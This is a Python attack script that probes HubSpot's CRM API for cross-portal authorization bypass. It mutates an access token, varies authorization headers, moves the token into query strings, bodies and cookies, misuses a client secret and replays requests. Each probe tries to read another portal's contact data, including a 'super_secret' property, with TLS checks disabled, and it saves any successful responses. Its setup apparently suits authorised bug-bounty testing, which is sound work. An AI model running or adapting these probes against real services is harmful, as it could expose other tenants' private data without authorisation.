#!/usr/bin/env python3
"""
Token and Authentication Manipulation Attacks
"""

import requests
import json
import os
import base64
import hmac
import hashlib
import time
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
CLIENT_SECRET = os.getenv('HUBSPOT_CLIENT_SECRET')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*80)
print("🔑 Token & Authentication Manipulation")
print("="*80)

findings = []

# ============================================================================
# 1. TOKEN STRUCTURE ANALYSIS
# ============================================================================

def analyze_token():
    """Analyze the access token structure"""
    print("\n[*] Analyzing token structure...")
    print(f"Token: {ACCESS_TOKEN}")
    print(f"Length: {len(ACCESS_TOKEN)}")

    parts = ACCESS_TOKEN.split('-')
    print(f"Parts: {len(parts)}")
    for i, part in enumerate(parts):
        print(f"  Part {i}: {part} (length: {len(part)})")

    # Try to decode if it's base64
    for part in parts:
        try:
            decoded = base64.b64decode(part + '==')  # Add padding
            print(f"    Decoded: {decoded}")
        except:
            pass

    # Check if portal ID is embedded
    if MY_PORTAL in ACCESS_TOKEN or TARGET_PORTAL in ACCESS_TOKEN:
        print(f"⚠️ Portal ID found in token!")

# ============================================================================
# 2. TOKEN MUTATION ATTACKS
# ============================================================================

def test_token_mutations():
    """Test various token mutations"""
    print("\n[*] Testing token mutations...")

    base_url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&properties=firstname,super_secret,email'

    mutations = {
        'Original': ACCESS_TOKEN,
        'Uppercase': ACCESS_TOKEN.upper(),
        'Lowercase': ACCESS_TOKEN.lower(),
        'Remove last char': ACCESS_TOKEN[:-1],
        'Add char': ACCESS_TOKEN + 'x',
        'Swap parts': '-'.join(ACCESS_TOKEN.split('-')[::-1]),
        'Duplicate': ACCESS_TOKEN + ACCESS_TOKEN,
    }

    # If token has parts, try replacing portal ID if embedded
    parts = ACCESS_TOKEN.split('-')
    if len(parts) >= 4:
        # Try replacing what might be portal ID
        for i in range(len(parts)):
            new_parts = parts.copy()
            new_parts[i] = TARGET_PORTAL
            mutations[f'Replace part {i} with target portal'] = '-'.join(new_parts)

    for name, token in mutations.items():
        try:
            headers = {'Authorization': f'Bearer {token}'}
            r = requests.get(base_url, headers=headers, verify=False, timeout=5)

            print(f"  {name}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    print(f"    🚨 SUCCESS!")
                    findings.append({'mutation': name, 'token': token, 'response': data})
        except:
            pass

# ============================================================================
# 3. AUTHORIZATION HEADER VARIATIONS
# ============================================================================

def test_auth_header_variations():
    """Test different authorization header formats"""
    print("\n[*] Testing authorization header variations...")

    url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&properties=firstname,super_secret,email'

    auth_variations = [
        {'Authorization': f'Bearer {ACCESS_TOKEN}'},  # Normal
        {'Authorization': f'bearer {ACCESS_TOKEN}'},  # Lowercase
        {'Authorization': f'BEARER {ACCESS_TOKEN}'},  # Uppercase
        {'Authorization': ACCESS_TOKEN},  # No Bearer
        {'Authorization': f'Token {ACCESS_TOKEN}'},  # Different scheme
        {'Authorization': f'Bearer {ACCESS_TOKEN} {ACCESS_TOKEN}'},  # Duplicate
        {'Authorization': f'Bearer {ACCESS_TOKEN}', 'X-Auth-Token': ACCESS_TOKEN},  # Multiple
        {'X-API-Key': ACCESS_TOKEN},  # Different header
        {'X-Access-Token': ACCESS_TOKEN},
        {'X-HubSpot-Access-Token': ACCESS_TOKEN},
    ]

    for headers in auth_variations:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    print(f"    🚨 SUCCESS with: {headers}")
                    findings.append({'headers': headers, 'response': data})
        except:
            pass

# ============================================================================
# 4. TOKEN IN DIFFERENT LOCATIONS
# ============================================================================

def test_token_locations():
    """Test sending token in different locations"""
    print("\n[*] Testing token in different locations...")

    base_url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&properties=firstname,super_secret,email'

    # Test 1: Token in query parameter
    try:
        url = f'{base_url}&access_token={ACCESS_TOKEN}'
        r = requests.get(url, verify=False, timeout=5)
        print(f"  Query param 'access_token': {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            if 'properties' in data:
                print(f"    🚨 SUCCESS!")
                findings.append({'location': 'query_access_token', 'response': data})
    except:
        pass

    # Test 2: Token in hapikey parameter (legacy)
    try:
        url = f'{base_url}&hapikey={ACCESS_TOKEN}'
        r = requests.get(url, verify=False, timeout=5)
        print(f"  Query param 'hapikey': {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            if 'properties' in data:
                findings.append({'location': 'query_hapikey', 'response': data})
    except:
        pass

    # Test 3: Token in POST body
    try:
        r = requests.post(
            'https://api.hubapi.com/crm/v3/objects/contacts/search',
            json={
                'access_token': ACCESS_TOKEN,
                'filterGroups': [],
                'properties': ['firstname', 'super_secret', 'email'],
                'portalId': TARGET_PORTAL
            },
            verify=False,
            timeout=5
        )
        print(f"  POST body 'access_token': {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            if data.get('results'):
                findings.append({'location': 'post_body', 'response': data})
    except:
        pass

    # Test 4: Token in Cookie
    try:
        headers = {'Cookie': f'access_token={ACCESS_TOKEN}'}
        r = requests.get(base_url, headers=headers, verify=False, timeout=5)
        print(f"  Cookie: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            if 'properties' in data:
                findings.append({'location': 'cookie', 'response': data})
    except:
        pass

# ============================================================================
# 5. CLIENT SECRET EXPLOITATION
# ============================================================================

def test_client_secret():
    """Test using client secret in various ways"""
    print("\n[*] Testing client secret exploitation...")

    if not CLIENT_SECRET:
        print("  No client secret available")
        return

    url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&properties=firstname,super_secret,email'

    # Test 1: Client secret as Bearer token
    try:
        headers = {'Authorization': f'Bearer {CLIENT_SECRET}'}
        r = requests.get(url, headers=headers, verify=False, timeout=5)
        print(f"  Client secret as Bearer: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            if 'properties' in data:
                findings.append({'attack': 'client_secret_bearer', 'response': data})
    except:
        pass

    # Test 2: HMAC signature with client secret
    try:
        timestamp = str(int(time.time()))
        message = f'{url}{timestamp}'
        signature = hmac.new(
            CLIENT_SECRET.encode(),
            message.encode(),
            hashlib.sha256
        ).hexdigest()

        headers = {
            'X-HubSpot-Signature': signature,
            'X-HubSpot-Request-Timestamp': timestamp
        }
        r = requests.get(url, headers=headers, verify=False, timeout=5)
        print(f"  HMAC signature: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            if 'properties' in data:
                findings.append({'attack': 'hmac_signature', 'response': data})
    except:
        pass

    # Test 3: Client secret in query
    try:
        test_url = f'{url}&client_secret={CLIENT_SECRET}'
        r = requests.get(test_url, verify=False, timeout=5)
        print(f"  Client secret in query: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            if 'properties' in data:
                findings.append({'attack': 'client_secret_query', 'response': data})
    except:
        pass

# ============================================================================
# 6. TOKEN REPLAY WITH MODIFIED REQUESTS
# ============================================================================

def test_token_replay():
    """Test token replay attacks"""
    print("\n[*] Testing token replay with modified requests...")

    # Use valid token but try to trick the system with conflicting parameters
    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Test 1: Send request for our portal, then immediately for target portal
    try:
        # First request - establish session
        r1 = requests.get(
            f'https://api.hubapi.com/crm/v3/objects/contacts/1',
            headers=headers,
            verify=False,
            timeout=5
        )

        # Second request - try to use same session for different portal
        r2 = requests.get(
            f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
            headers=headers,
            verify=False,
            timeout=5
        )

        print(f"  Sequential requests: {r1.status_code} -> {r2.status_code}")

        if r2.status_code == 200:
            data = r2.json()
            if 'properties' in data:
                findings.append({'attack': 'sequential_replay', 'response': data})
    except:
        pass

# ============================================================================
# MAIN
# ============================================================================

analyze_token()
test_token_mutations()
test_auth_header_variations()
test_token_locations()
test_client_secret()
test_token_replay()

print("\n" + "="*80)
print(f"✅ Token Manipulation Tests Complete")
print(f"📊 Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n🎉 SUCCESSFUL TOKEN ATTACKS:\n")
    for i, finding in enumerate(findings, 1):
        print(f"{i}. {json.dumps(finding, indent=2)[:300]}...")

    with open('/home/user/Hub/findings/token_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)
else:
    print("\n❌ No token-based bypasses found.")
